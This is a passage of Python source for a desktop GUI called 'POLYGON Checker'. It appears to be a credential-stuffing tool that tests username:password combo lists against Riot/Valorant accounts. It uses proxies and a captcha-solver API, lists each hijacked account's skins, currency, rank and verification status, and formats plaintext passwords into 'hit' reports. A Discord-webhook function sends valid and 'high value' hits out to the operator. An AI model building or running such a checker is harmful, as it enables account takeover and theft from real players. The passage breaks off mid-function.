        """Handle image download completion (same logic as test script) - shared handler for MainWindow"""
        try:
            if reply.error() == QNetworkReply.NoError:
                data = reply.readAll()
                pixmap = QPixmap()
                if pixmap.loadFromData(data) and not pixmap.isNull():
                    scaled_pixmap = pixmap.scaled(size, size, Qt.KeepAspectRatio, Qt.SmoothTransformation)
                    label.setPixmap(scaled_pixmap)
                    label.setText("")
                else:
                    label.setText("Load Failed")
                    label.setAlignment(Qt.AlignCenter)
            else:
                label.setText("Network Error")
                label.setAlignment(Qt.AlignCenter)
        except Exception as e:
            label.setText("Error")
            label.setAlignment(Qt.AlignCenter)
        finally:
            reply.deleteLater()
    
    def _create_items_list_tab(self, items_list, item_type):
        widget = QWidget()
        layout = QVBoxLayout()
        widget.setLayout(layout)
        if not items_list:
            label = QLabel(f"No {item_type.lower()}s unlocked")
            label.setAlignment(Qt.AlignCenter)
            layout.addWidget(label)
            return widget
        table = QTableWidget()
        table.setColumnCount(2)
        table.setHorizontalHeaderLabels(["Name", "Rarity"])
        table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        table.setSelectionBehavior(QAbstractItemView.SelectRows)
        table.setRowCount(len(items_list))
        for row, item in enumerate(items_list):
            name = item.get('name', 'Unknown')
            rarity = item.get('rarity', 'Unknown')
            table.setItem(row, 0, QTableWidgetItem(name))
            table.setItem(row, 1, QTableWidgetItem(rarity))
        header = table.horizontalHeader()
        for i in range(2):
            header.setSectionResizeMode(i, QHeaderView.Stretch)
        layout.addWidget(table)
        button_layout = QHBoxLayout()
        copy_btn = QPushButton(f"Copy {item_type} List")
        copy_btn.clicked.connect(lambda: self._copy_item_list(items_list))
        button_layout.addWidget(copy_btn)
        button_layout.addStretch()
        layout.addLayout(button_layout)
        return widget
    
    def _copy_skin_list(self, skin_details):
        try:
            skin_lines = []
            for skin in skin_details:
                skin_name = skin.get('name', 'Unknown')
                weapon = skin.get('weapon', 'Unknown')
                rarity = skin.get('rarity', 'Unknown')
                skin_lines.append(f"{skin_name} ({weapon}) - {rarity}")
            skin_text = '\n'.join(skin_lines)
            clipboard = QApplication.clipboard()
            clipboard.setText(skin_text)
            self.add_log_entry(f"Copied {len(skin_lines)} skins to clipboard", "INFO")
        except Exception as e:
            self.add_log_entry(f"Error copying skin list: {e}", "ERROR")
    
    def _copy_item_list(self, items):
        try:
            item_lines = []
            for item in items:
                name = item.get('name', 'Unknown')
                rarity = item.get('rarity', 'Unknown')
                item_lines.append(f"{name} - {rarity}")
            item_text = '\n'.join(item_lines)
            clipboard = QApplication.clipboard()
            clipboard.setText(item_text)
            self.add_log_entry(f"Copied {len(item_lines)} items to clipboard", "INFO")
        except Exception as e:
            self.add_log_entry(f"Error copying item list: {e}", "ERROR")
    
    def _create_uuid_list_tab(self, items_list, item_type):
        widget = QWidget()
        layout = QVBoxLayout()
        widget.setLayout(layout)
        if not items_list:
            label = QLabel(f"No {item_type.lower()}s unlocked")
            label.setAlignment(Qt.AlignCenter)
            layout.addWidget(label)
            return widget
        table = QTableWidget()
        table.setColumnCount(1)
        table.setHorizontalHeaderLabels(["UUID"])
        table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        table.setSelectionBehavior(QAbstractItemView.SelectRows)
        table.setRowCount(len(items_list))
        for row, item in enumerate(items_list):
            uuid = item.get('uuid', 'Unknown')
            table.setItem(row, 0, QTableWidgetItem(uuid))
        header = table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.Stretch)
        layout.addWidget(table)
        button_layout = QHBoxLayout()
        copy_btn = QPushButton(f"Copy {item_type} UUIDs")
        copy_btn.clicked.connect(lambda: self._copy_uuid_list(items_list))
        button_layout.addWidget(copy_btn)
        button_layout.addStretch()
        layout.addLayout(button_layout)
        return widget
    
    def _copy_uuid_list(self, items):
        try:
            uuid_lines = [item.get('uuid', 'Unknown') for item in items]
            uuid_text = '\n'.join(uuid_lines)
            clipboard = QApplication.clipboard()
            clipboard.setText(uuid_text)
            self.add_log_entry(f"Copied {len(uuid_lines)} UUIDs to clipboard", "INFO")
        except Exception as e:
            self.add_log_entry(f"Error copying UUID list: {e}", "ERROR")
    
    def _create_skin_statistics_tab(self, combo_data):
        """Create a statistics tab showing detailed skin statistics"""
        widget = QWidget()
        layout = QVBoxLayout()
        widget.setLayout(layout)
        
        # Title
        title_label = QLabel("Skin Statistics")
        title_label.setFont(QFont("Arial", 14, QFont.Bold))
        layout.addWidget(title_label)
        
        # Scroll area for statistics
        scroll_area = QScrollArea()
        scroll_area.setWidgetResizable(True)
        scroll_area.setStyleSheet("QScrollArea { border: none; }")
        
        stats_widget = QWidget()
        stats_layout = QVBoxLayout()
        stats_widget.setLayout(stats_layout)
        
        # Get all skin data
        equipped_skins = combo_data.get('skin_details', [])
        all_skins = combo_data.get('weapon_skins', [])
        all_skins_to_analyze = all_skins if all_skins else equipped_skins
        
        if not all_skins_to_analyze:
            no_data_label = QLabel("No skin data available")
            no_data_label.setAlignment(Qt.AlignCenter)
            stats_layout.addWidget(no_data_label)
            scroll_area.setWidget(stats_widget)
            layout.addWidget(scroll_area)
            return widget
        
        # Calculate statistics
        rarity_counts = {}
        weapon_counts = {}
        total_skins = len(all_skins_to_analyze)
        
        for skin in all_skins_to_analyze:
            rarity = skin.get('rarity', 'Unknown')
            weapon = skin.get('weapon', 'Unknown')
            
            rarity_counts[rarity] = rarity_counts.get(rarity, 0) + 1
            weapon_counts[weapon] = weapon_counts.get(weapon, 0) + 1
        
        # Overall Statistics Section
        overall_group = QGroupBox("Overall Statistics")
        overall_layout = QVBoxLayout()
        overall_group.setLayout(overall_layout)
        
        overall_stats = [
            ("Total Skins", str(total_skins)),
            ("Equipped Skins", str(len(equipped_skins))),
            ("All Weapon Skins", str(combo_data.get('weapon_skins_count', 0))),
            ("Skin Chromas", str(combo_data.get('skin_chromas_count', 0))),
            ("Skin Levels", str(combo_data.get('skin_levels_count', 0))),
        ]
        
        for label, value in overall_stats:
            stat_row = QHBoxLayout()
            stat_label = QLabel(f"{label}:")
            stat_label.setStyleSheet("font-weight: bold;")
            stat_value = QLabel(value)
            stat_row.addWidget(stat_label)
            stat_row.addStretch()
            stat_row.addWidget(stat_value)
            overall_layout.addLayout(stat_row)
        
        stats_layout.addWidget(overall_group)
        
        # Rarity Breakdown Section
        rarity_group = QGroupBox("Rarity Breakdown")
        rarity_layout = QVBoxLayout()
        rarity_group.setLayout(rarity_layout)
        
        # Sort rarities by count (descending)
        sorted_rarities = sorted(rarity_counts.items(), key=lambda x: x[1], reverse=True)
        
        rarity_table = QTableWidget()
        rarity_table.setColumnCount(2)
        rarity_table.setHorizontalHeaderLabels(["Rarity", "Count"])
        rarity_table.setRowCount(len(sorted_rarities))
        rarity_table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        rarity_table.setSelectionBehavior(QAbstractItemView.SelectRows)
        
        for row, (rarity, count) in enumerate(sorted_rarities):
            rarity_table.setItem(row, 0, QTableWidgetItem(rarity))
            count_item = QTableWidgetItem(str(count))
            rarity_table.setItem(row, 1, count_item)
        
        rarity_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.Stretch)
        rarity_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeToContents)
        rarity_table.setMaximumHeight(200)
        rarity_layout.addWidget(rarity_table)
        
        stats_layout.addWidget(rarity_group)
        
        # Weapon Type Breakdown Section
        weapon_group = QGroupBox("Weapon Type Breakdown")
        weapon_layout = QVBoxLayout()
        weapon_group.setLayout(weapon_layout)
        
        # Sort weapons by count (descending)
        sorted_weapons = sorted(weapon_counts.items(), key=lambda x: x[1], reverse=True)
        
        weapon_table = QTableWidget()
        weapon_table.setColumnCount(2)
        weapon_table.setHorizontalHeaderLabels(["Weapon", "Skin Count"])
        weapon_table.setRowCount(len(sorted_weapons))
        weapon_table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        weapon_table.setSelectionBehavior(QAbstractItemView.SelectRows)
        
        for row, (weapon, count) in enumerate(sorted_weapons):
            weapon_table.setItem(row, 0, QTableWidgetItem(weapon))
            count_item = QTableWidgetItem(str(count))
            weapon_table.setItem(row, 1, count_item)
        
        weapon_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.Stretch)
        weapon_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeToContents)
        weapon_table.setMaximumHeight(300)
        weapon_layout.addWidget(weapon_table)
        
        stats_layout.addWidget(weapon_group)
        
        # Top Weapons by Skin Count
        if sorted_weapons:
            top_weapons_group = QGroupBox("Top Weapons (Most Skins)")
            top_weapons_layout = QVBoxLayout()
            top_weapons_group.setLayout(top_weapons_layout)
            
            top_5 = sorted_weapons[:5]
            for i, (weapon, count) in enumerate(top_5, 1):
                weapon_row = QHBoxLayout()
                rank_label = QLabel(f"{i}.")
                rank_label.setStyleSheet("font-weight: bold; color: #4CAF50;")
                weapon_label = QLabel(weapon)
                count_label = QLabel(f"{count} skins")
                count_label.setStyleSheet("color: #888;")
                weapon_row.addWidget(rank_label)
                weapon_row.addWidget(weapon_label)
                weapon_row.addStretch()
                weapon_row.addWidget(count_label)
                top_weapons_layout.addLayout(weapon_row)
            
            stats_layout.addWidget(top_weapons_group)
        
        stats_layout.addStretch()
        scroll_area.setWidget(stats_widget)
        layout.addWidget(scroll_area)
        
        return widget
    
    def _create_account_info_tab(self, combo_data):
        widget = QWidget()
        layout = QVBoxLayout()
        widget.setLayout(layout)
        info_label = QLabel("Account Information")
        info_label.setFont(QFont("Arial", 12, QFont.Bold))
        layout.addWidget(info_label)
        info_text = QTextEdit()
        info_text.setReadOnly(True)
        info_text.setMaximumHeight(400)
        info_lines = []
        info_lines.append("=== VERIFICATION STATUS ===")
        info_lines.append(f"\ud83d\udce7 Email: {combo_data.get('email_status', 'UNKNOWN')}")
        info_lines.append(f"\ud83d\udcf1 Phone: {combo_data.get('phone_status', 'UNKNOWN')}")
        info_lines.append("")
        info_lines.append("=== MATCH HISTORY ===")
        total_matches = combo_data.get('total_matches', 0)
        info_lines.append(f"\ud83c\udfae Total Matches Played: {total_matches}")
        recent_matches = combo_data.get('recent_matches', [])
        if recent_matches:
            info_lines.append(f"\ud83d\udcca Recent Matches: {len(recent_matches)}")
            for i, match in enumerate(recent_matches[:5], 1):
                match_id = match.get('match_id', 'Unknown')[:8]
                queue = match.get('queue_id', 'Unknown')
                info_lines.append(f"  {i}. Match {match_id}... - Queue: {queue}")
        else:
            info_lines.append("\ud83d\udcca No recent match data available")
        info_lines.append("")
        info_lines.append("=== ACCOUNT RESTRICTIONS ===")
        penalty_status = combo_data.get('penalty_status', 'UNKNOWN')
        has_penalties = combo_data.get('has_penalties', False)
        if has_penalties:
            info_lines.append(f"\u26a0\ufe0f Status: {penalty_status}")
            penalties = combo_data.get('penalties', [])
            if penalties:
                info_lines.append(f"\u26d4 Active Penalties: {len(penalties)}")
                for i, penalty in enumerate(penalties, 1):
                    penalty_type = penalty.get('Type', 'Unknown')
                    info_lines.append(f"  {i}. Type: {penalty_type}")
        else:
            info_lines.append(f"\u2705 Status: {penalty_status}")
        info_lines.append("")
        info_lines.append("=== COSMETICS SUMMARY ===")
        info_lines.append(f"\ud83d\udd2b Equipped Skins: {combo_data.get('skins', 0)}")
        info_lines.append(f"\ud83d\udd2b All Weapon Skins: {combo_data.get('weapon_skins_count', 0)}")
        info_lines.append(f"\ud83c\udfa8 Skin Chromas: {combo_data.get('skin_chromas_count', 0)}")
        info_lines.append(f"\u2b06\ufe0f Skin Levels: {combo_data.get('skin_levels_count', 0)}")
        info_lines.append(f"\ud83c\udf80 Buddies: {combo_data.get('buddies_count', 0)}")
        info_lines.append(f"\ud83c\udcbf Player Cards: {combo_data.get('player_cards_count', 0)}")
        info_lines.append(f"\ud83c\udfa8 Sprays: {combo_data.get('sprays_count', 0)}")
        info_lines.append("")
        info_lines.append("=== ACCOUNT DETAILS ===")
        info_lines.append(f"\ud83d\udc64 Riot ID: {combo_data.get('riot_id', 'Unknown')}")
        info_lines.append(f"\ud83c\udf0d Region: {combo_data.get('region', 'Unknown')}")
        info_lines.append(f"\ud83c\udff3\ufe0f Country: {combo_data.get('country', 'Unknown')}")
        info_lines.append(f"\ud83d\udcca Level: {combo_data.get('level', 0)}")
        info_lines.append(f"\ud83c\udf96\ufe0f Rank: {combo_data.get('rank', 'Unranked')}")
        info_lines.append(f"\ud83d\udc65 Agents: {combo_data.get('agents', 0)}")
        info_lines.append(f"\ud83d\udc8e VP: {combo_data.get('vp', 0)}")
        info_lines.append(f"\2728 RD: {combo_data.get('rd', 0)}")
        info_text.setText('\n'.join(info_lines))
        layout.addWidget(info_text)
        button_layout = QHBoxLayout()
        copy_btn = QPushButton("Copy Account Info")
        copy_btn.clicked.connect(lambda: self._copy_account_info(combo_data))
        button_layout.addWidget(copy_btn)
        button_layout.addStretch()
        layout.addLayout(button_layout)
        return widget
    
    def _copy_account_info(self, combo_data):
        try:
            info_lines = []
            info_lines.append(f"Username: {combo_data.get('username', 'Unknown')}")
            info_lines.append(f"Riot ID: {combo_data.get('riot_id', 'Unknown')}")
            info_lines.append(f"Region: {combo_data.get('region', 'Unknown')}")
            info_lines.append(f"Country: {combo_data.get('country', 'Unknown')}")
            info_lines.append(f"Level: {combo_data.get('level', 0)}")
            info_lines.append(f"Rank: {combo_data.get('rank', 'Unranked')}")
            info_lines.append(f"VP: {combo_data.get('vp', 0)}")
            info_lines.append(f"RD: {combo_data.get('rd', 0)}")
            info_lines.append(f"Agents: {combo_data.get('agents', 0)}")
            info_lines.append(f"Email Status: {combo_data.get('email_status', 'UNKNOWN')}")
            info_lines.append(f"Phone Status: {combo_data.get('phone_status', 'UNKNOWN')}")
            info_lines.append(f"Total Matches: {combo_data.get('total_matches', 0)}")
            info_lines.append(f"Penalty Status: {combo_data.get('penalty_status', 'UNKNOWN')}")
            info_lines.append(f"Weapon Skins: {combo_data.get('weapon_skins_count', 0)}")
            info_lines.append(f"Buddies: {combo_data.get('buddies_count', 0)}")
            info_lines.append(f"Player Cards: {combo_data.get('player_cards_count', 0)}")
            info_lines.append(f"Sprays: {combo_data.get('sprays_count', 0)}")
            info_text = '\n'.join(info_lines)
            clipboard = QApplication.clipboard()
            clipboard.setText(info_text)
            self.add_log_entry("Copied account info to clipboard", "INFO")
        except Exception as e:
            self.add_log_entry(f"Error copying account info: {e}", "ERROR")
    
    def _save_api_key(self, api_key: str):
        try:
            config = {"api_key": api_key}
            with open(self.config_file, 'w') as f:
                _json2.dump(config, f)
        except Exception as e:
            self.add_log_entry(f"Failed to save API configuration: {e}", "ERROR")

    def _load_api_key(self):
        try:
            if _os.path.exists(self.config_file):
                with open(self.config_file, 'r') as f:
                    config = _json2.load(f)
                    if not isinstance(config, dict):
                        config = {}
                    api_key = config.get("api_key", "")
                    if api_key:
                        self.api_key_input.setText(api_key)
                        self.captcha_solver.api_key = api_key
                        self.add_log_entry("API Key loaded from saved config", "INFO")
        except Exception as e:
            self.add_log_entry(f"Failed to load saved API key: {e}", "DEBUG")
    
    def _load_existing_combos(self):
        try:
            existing_combos = self.storage.get_all_combos()
            if existing_combos:
                total_count = len(existing_combos)
                self.combo_count_label.setText(f"Loaded: {total_count} combos")
                self._populate_results_table(existing_combos)
                stats = self.storage.get_statistics()
                self.add_log_entry(f"Loaded {total_count} existing combos from storage (Pending: {stats['pending']}, Valid: {stats['valid']}, Invalid: {stats['invalid']})", "INFO")
            else:
                self.add_log_entry("No existing combos found in storage", "DEBUG")
        except Exception as e:
            self.add_log_entry(f"Failed to load existing combos: {e}", "ERROR")
    
    def _populate_results_table(self, combos: list):
        self.results_table.setRowCount(len(combos))
        for row, combo in enumerate(combos):
            self.results_table.setItem(row, 0, QTableWidgetItem(str(row + 1)))
            status = combo.get('status', 'pending')
            if status == 'valid':
                self.results_table.setItem(row, 1, QTableWidgetItem(combo.get('region', '')))
                self.results_table.setItem(row, 2, QTableWidgetItem(combo.get('username', '')))
                self.results_table.setItem(row, 3, QTableWidgetItem(combo.get('riot_id', '')))
                self.results_table.setItem(row, 4, QTableWidgetItem(str(combo.get('level', 0))))
                self.results_table.setItem(row, 5, QTableWidgetItem(str(combo.get('vp', 0))))
                self.results_table.setItem(row, 6, QTableWidgetItem(str(combo.get('rd', 0))))
                self.results_table.setItem(row, 7, QTableWidgetItem(str(combo.get('skins', 0))))
                self.results_table.setItem(row, 8, QTableWidgetItem(str(combo.get('agents', 0))))
                rank_display = _invert_control_rank_for_display(str(combo.get('rank', '')))
                self.results_table.setItem(row, 9, QTableWidgetItem(rank_display))
                self.results_table.setItem(row, 10, QTableWidgetItem(combo.get('email_status', 'UNKNOWN')))
                self.results_table.setItem(row, 11, QTableWidgetItem(combo.get('phone_status', 'UNKNOWN')))
                self.results_table.setItem(row, 12, QTableWidgetItem(str(combo.get('total_matches', 0))))
                self.results_table.setItem(row, 13, QTableWidgetItem(combo.get('penalty_status', 'UNKNOWN')))
                self.results_table.setItem(row, 14, QTableWidgetItem(combo.get('country', '')))
                for col in range(15):
                    item = self.results_table.item(row, col)
                    if item:
                        item.setForeground(QColor("#00ff00"))
            elif status == 'invalid':
                self.results_table.setItem(row, 1, QTableWidgetItem("Invalid"))
                self.results_table.setItem(row, 2, QTableWidgetItem(combo.get('username', '')))
                self.results_table.setItem(row, 3, QTableWidgetItem("Invalid credentials"))
                for col in range(4, 15):
                    self.results_table.setItem(row, col, QTableWidgetItem("-"))
                for col in range(15):
                    item = self.results_table.item(row, col)
                    if item:
                        item.setForeground(QColor("#ff0000"))
            else:
                self.results_table.setItem(row, 1, QTableWidgetItem("Pending"))
                self.results_table.setItem(row, 2, QTableWidgetItem(combo.get('username', '')))
                self.results_table.setItem(row, 3, QTableWidgetItem("Not checked yet"))
                for col in range(4, 15):
                    self.results_table.setItem(row, col, QTableWidgetItem("-"))
                for col in range(15):
                    item = self.results_table.item(row, col)
                    if item:
                        item.setForeground(QColor("#888888"))
    
    def _add_combos_to_table(self, combos: list):
        current_row_count = self.results_table.rowCount()
        for i, combo in enumerate(combos):
            row = current_row_count + i
            self.results_table.insertRow(row)
            self.results_table.setItem(row, 0, QTableWidgetItem(str(row + 1)))
            self.results_table.setItem(row, 1, QTableWidgetItem("Pending"))
            self.results_table.setItem(row, 2, QTableWidgetItem(combo['username']))
            self.results_table.setItem(row, 3, QTableWidgetItem("Not checked yet"))
            self.results_table.setItem(row, 4, QTableWidgetItem("-"))
            self.results_table.setItem(row, 5, QTableWidgetItem("-"))
            self.results_table.setItem(row, 6, QTableWidgetItem("-"))
            self.results_table.setItem(row, 7, QTableWidgetItem("-"))
            self.results_table.setItem(row, 8, QTableWidgetItem("-"))
            self.results_table.setItem(row, 9, QTableWidgetItem("Pending..."))
            self.results_table.setItem(row, 10, QTableWidgetItem("-"))
            self.results_table.setItem(row, 11, QTableWidgetItem("-"))
            self.results_table.setItem(row, 12, QTableWidgetItem("-"))
            self.results_table.setItem(row, 13, QTableWidgetItem("-"))
            self.results_table.setItem(row, 14, QTableWidgetItem("-"))
            for col in range(15):
                item = self.results_table.item(row, col)
                if item:
                    item.setForeground(QColor("#888888"))


# Singletons (no FastAPI)
_LOGGER = CheckerLogger()
_STORAGE = MemoryStorage(log_callback=_LOGGER.log)
_PROXIES = ProxyManager()
_SOLVER = CaptchaSolver(api_key="", log_callback=_LOGGER.log)
_CHECKER = AccountChecker(storage=_STORAGE, proxy_manager=_PROXIES, captcha_solver=_SOLVER, logger=_LOGGER, use_captcha_solver=True)

# In-memory settings
SETTINGS = {
    'show_credentials': True,
    'show_status': True,
    'show_level': True,
    'show_vp': True,
    'show_rd': True,
    'show_kc': True,
    'show_rank': True,
    'show_skins': True,
    'show_buddies': True,
    'show_cards': True,
    'show_sprays': True,
    'show_chromas': True,
    'show_skin_levels': True,
    'show_matches': True,
    'show_email': True,
    'show_phone': True,
    'show_penalties': True,
    'show_country': True,
    'show_json_in_full_capture': False,
}

def _format_block(combo: dict) -> str:
    lines = []
    
    # Credentials
    if SETTINGS.get('show_credentials'):
        creds = f"{combo.get('username','')}:{combo.get('password','')}"
        lines.append(f"Credentials: {creds}")
    
    # Status
    if SETTINGS.get('show_status'):
        status = 'VALID' if combo.get('status') == 'valid' else ('INVALID' if combo.get('status') == 'invalid' else combo.get('status','PENDING').upper())
        lines.append(f"Status: {status}")
    
    # Level
    if SETTINGS.get('show_level'):
        level = combo.get('level') if combo.get('level') is not None else 'N/A'
        lines.append(f"Level: {level}")
    
    # VP (Valorant Points)
    if SETTINGS.get('show_vp'):
        vp = combo.get('vp', 0)
        lines.append(f"VP: {vp}")
    
    # Radianite Points
    if SETTINGS.get('show_rd'):
        rd = combo.get('rd', 0)
        lines.append(f"Radianite: {rd}")
    
    # Kingdom Credits
    if SETTINGS.get('show_kc', True):
        kc = combo.get('kc', 0)
        lines.append(f"KC: {kc}")
    
    # Rank
    if SETTINGS.get('show_rank'):
        rank = combo.get('rank','Unranked')
        lines.append(f"Rank: {rank}")
    
    # Skins
    if SETTINGS.get('show_skins'):
        skins = combo.get('skins', 0)
        weapon_skins = combo.get('weapon_skins_count', 0)
        lines.append(f"Skins: {skins} | All Skins: {weapon_skins}")
    
    # Buddies
    if SETTINGS.get('show_buddies'):
        buddies = combo.get('buddies_count', 0)
        lines.append(f"Buddies: {buddies}")
    
    # Cards
    if SETTINGS.get('show_cards'):
        cards = combo.get('player_cards_count', 0)
        lines.append(f"Cards: {cards}")
    
    # Sprays
    if SETTINGS.get('show_sprays'):
        sprays = combo.get('sprays_count', 0)
        lines.append(f"Sprays: {sprays}")
    
    # Chromas
    if SETTINGS.get('show_chromas'):
        chromas = combo.get('skin_chromas_count', 0)
        lines.append(f"Chromas: {chromas}")
    
    # Skin Levels
    if SETTINGS.get('show_skin_levels'):
        skin_levels = combo.get('skin_levels_count', 0)
        lines.append(f"Skin Levels: {skin_levels}")
    
    # Matches
    if SETTINGS.get('show_matches'):
        matches = combo.get('total_matches', 0)
        lines.append(f"Matches: {matches}")
    
    # Email & Phone
    email_phone_parts = []
    if SETTINGS.get('show_email'):
        email = combo.get('email_status','UNKNOWN')
        email_phone_parts.append(f"Email: {email}")
    if SETTINGS.get('show_phone'):
        phone = combo.get('phone_status','UNKNOWN')
        email_phone_parts.append(f"Phone: {phone}")
    if email_phone_parts:
        lines.append(' | '.join(email_phone_parts))
    
    # Penalties
    if SETTINGS.get('show_penalties'):
        penalties = combo.get('penalty_status','UNKNOWN')
        lines.append(f"Penalties: {penalties}")
    
    # Country
    if SETTINGS.get('show_country'):
        country = combo.get('country','Unknown')
        lines.append(f"Country: {country}")
    
    return '\n'.join(lines) + '\n' if lines else 'No data to display\n'


def _format_full_details(combo: dict) -> str:
    """Format comprehensive account details in the specified format"""
    lines = []
    
    # Header
    lines.append("┏" + "━" * 60)
    lines.append(f"┃ Username: {combo.get('username', 'N/A')}")
    lines.append(f"┃ Password: {combo.get('password', 'N/A')}")
    lines.append(f"┃ Region: {combo.get('region', 'N/A')}")
    lines.append(f"┃ Riot ID: {combo.get('riot_id', 'N/A')}")
    lines.append(f"┃ Email Verified: {combo.get('email_status', 'UNKNOWN')}")
    lines.append(f"┃ Email Address: {combo.get('email_address', '')}")
    lines.append(f"┃ Phone Verified: {combo.get('phone_status', 'UNKNOWN')}")
    lines.append(f"┃ Account Level: {combo.get('level', 'N/A')}")
    lines.append(f"┃ Valorant Points: {combo.get('vp', 0)}")
    lines.append(f"┃ Radianite Points: {combo.get('rd', 0)}")
    lines.append(f"┃ Kingdom Credits: {combo.get('kc', 0)}")
    
    # Account Information
    lines.append("┣" + "━" * 60)
    lines.append("┃ Account Information")
    lines.append(f"┃ - Account Creation Country: {combo.get('country', 'Unknown')}")
    lines.append(f"┃ - Account Created At: {combo.get('created_at', 'Unknown')}")
    lines.append(f"┃ - Password Changed At: {combo.get('password_changed_at', 'Unknown')}")
    from datetime import datetime
    lines.append(f"┃ - Checked At: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")
    
    # Agents
    agents_list = combo.get('agents_list', [])
    if agents_list:
        lines.append("┣" + "━" * 60)
        lines.append(f"┃ Agents ({len(agents_list)}):")
        for agent in agents_list:
            lines.append(f"┃   • {agent}")
    
    # Weapons (Skins)
    weapon_skins_list = combo.get('weapon_skins_list', [])
    if weapon_skins_list:
        lines.append("┣" + "━" * 60)
        lines.append(f"┃ Weapons ({len(weapon_skins_list)}):")
        for skin in weapon_skins_list:
            lines.append(f"┃   • {skin}")
    
    # Weapon Chromas
    skin_chromas_list = combo.get('skin_chromas_list', [])
    if skin_chromas_list:
        lines.append("┣" + "━" * 60)
        lines.append(f"┃ Weapon Chromas ({len(skin_chromas_list)}):")
        for chroma in skin_chromas_list:
            lines.append(f"┃   • {chroma}")
    
    # Knives (Melee Skins)
    melee_skins_list = combo.get('melee_skins_list', [])
    if melee_skins_list:
        lines.append("┣" + "━" * 60)
        lines.append(f"┃ Knives ({len(melee_skins_list)}):")
        for melee in melee_skins_list:
            lines.append(f"┃   • {melee}")
    
    # Gun Buddies
    buddies_list = combo.get('buddies_list', [])
    if buddies_list:
        lines.append("┣" + "━" * 60)
        lines.append(f"┃ Gun Buddies ({len(buddies_list)}):")
        for buddy in buddies_list:
            lines.append(f"┃   • {buddy}")
    
    # Sprays
    sprays_list = combo.get('sprays_list', [])
    if sprays_list:
        lines.append("┣" + "━" * 60)
        lines.append(f"┃ Sprays ({len(sprays_list)}):")
        for spray in sprays_list:
            lines.append(f"┃   • {spray}")
    
    # Player Titles
    titles_list = combo.get('titles_list', [])
    if titles_list:
        lines.append("┣" + "━" * 60)
        lines.append(f"┃ Player Titles ({len(titles_list)}):")
        for title in titles_list:
            lines.append(f"┃   • {title}")
    
    # Player Cards
    player_cards_list = combo.get('player_cards_list', [])
    if player_cards_list:
        lines.append("┣" + "━" * 60)
        lines.append(f"┃ Player Cards ({len(player_cards_list)}):")
        for card in player_cards_list:
            lines.append(f"┃   • {card}")
    
    # Ranks History
    rank_history = combo.get('rank_history', [])
    if rank_history:
        lines.append("┣" + "━" * 60)
        lines.append("┃ Ranks:")
        for rank_data in rank_history:
            season = rank_data.get('season', 'Unknown')
            rank = rank_data.get('rank', 'Unranked')
            wins = rank_data.get('wins', 0)
            games = rank_data.get('games', 0)
            win_rate = rank_data.get('win_rate', 0)
            lines.append(f"┃   • Season: {season}")
            lines.append(f"┃     - Rank: {rank}")
            lines.append(f"┃     - Wins: {wins}")
            lines.append(f"┃     - Games: {games}")
            lines.append(f"┃     - Win Rate: {win_rate}%")
    
    # Current Rank Summary
    lines.append("┣" + "━" * 60)
    lines.append(f"┃ Current Rank: {combo.get('rank', 'Unranked')}")
    lines.append(f"┃ Peak Rank: {combo.get('peak_rank', 'N/A')}")
    lines.append(f"┃ Total Matches: {combo.get('total_matches', 0)}")
    
    # Account Status
    lines.append("┣" + "━" * 60)
    lines.append("┃ Account Status:")
    lines.append(f"┃ Penalty Status: {combo.get('penalty_status', 'UNKNOWN')}")
    lines.append(f"┃ Last Game Date: {combo.get('last_game_date', 'N/A')}")
    
    # Footer
    lines.append("┗" + "━" * 60)
    
    return '\n'.join(lines)




#=========================
# Configuration Storage
#=========================
CONFIG_FILE = get_file_path("checker_config.json")
WEBHOOK_CONFIG = {
    "enabled": False,
    "url": "",
    "username": "POLYGON Checker",
    "on_valid": True,
    "on_banned": False,
    "on_high_value": True,
    "on_error": False,
    "ping_high_value": False,
    "ping_rare": False,
    "ping_all_valid": False,
    "ping_banned": False
}

def load_config():
    """Load configuration from file"""
    global WEBHOOK_CONFIG, SETTINGS
    try:
        if _os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r') as f:
                config = json.load(f)
                if 'webhook' in config:
                    WEBHOOK_CONFIG.update(config['webhook'])
                if 'settings' in config:
                    SETTINGS.update(config['settings'])
                if 'api_key' in config and config['api_key']:
                    _SOLVER.api_key = config['api_key']
                return config
    except Exception as e:
        print(f"Error loading config: {e}")
    return {}

def save_config():
    """Save configuration to file"""
    try:
        config = {
            'webhook': WEBHOOK_CONFIG,
            'settings': SETTINGS,
            'api_key': _SOLVER.api_key if _SOLVER.api_key else ""
        }
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=2)
        return True
    except Exception as e:
        print(f"Error saving config: {e}")
        return False

def send_discord_webhook(combo_data: dict):
    """Send account hit to Discord webhook"""
    if not WEBHOOK_CONFIG.get('enabled') or not WEBHOOK_CONFIG.get('url'):
        return
    
    try:
        # Skip None#None accounts
        riot_id = combo_data.get('riot_id', '')
        if riot_id in ['None#None', '', 'N/A', 'Unknown']:
            return
        
        # Determine if we should send based on filters
        status = combo_data.get('status', '')
        skins_count = combo_data.get('weapon_skins_count', 0)
        level = combo_data.get('level', 0)
        vp = combo_data.get('vp', 0)
        
        should_send = False
        if status == 'valid' and WEBHOOK_CONFIG.get('on_valid'):
            should_send = True
        if 'BANNED' in str(combo_data.get('penalty_status', '')) and WEBHOOK_CONFIG.get('on_banned'):
            should_send = True
        if skins_count >= 50 and WEBHOOK_CONFIG.get('on_high_value'):
            should_send = True
        
        if not should_send:
            return
        
        # Determine embed color and title
        color = 5763719  # Green for valid
        title_prefix = "✅ VALID HIT"
        
        if 'BANNED' in str(combo_data.get('penalty_status', '')):
            color = 15548997  # Red for banned
            title_prefix = "🚫 BANNED ACCOUNT"
        elif skins_count >= 50:
            color = 16766720  # Gold for high value
            title_prefix = "💎 HIGH VALUE HIT"
        
        # Determine if we should ping @everyone
        should_ping = False
        
        if WEBHOOK_CONFIG.get('ping_all_valid') and status == 'valid':
            should_ping = True
        elif WEBHOOK_CONFIG.get('ping_high_value') and skins_count >= 50:
            should_ping = True
        elif WEBHOOK_CONFIG.get('ping_rare') and vp >= 100:
            should_ping = True
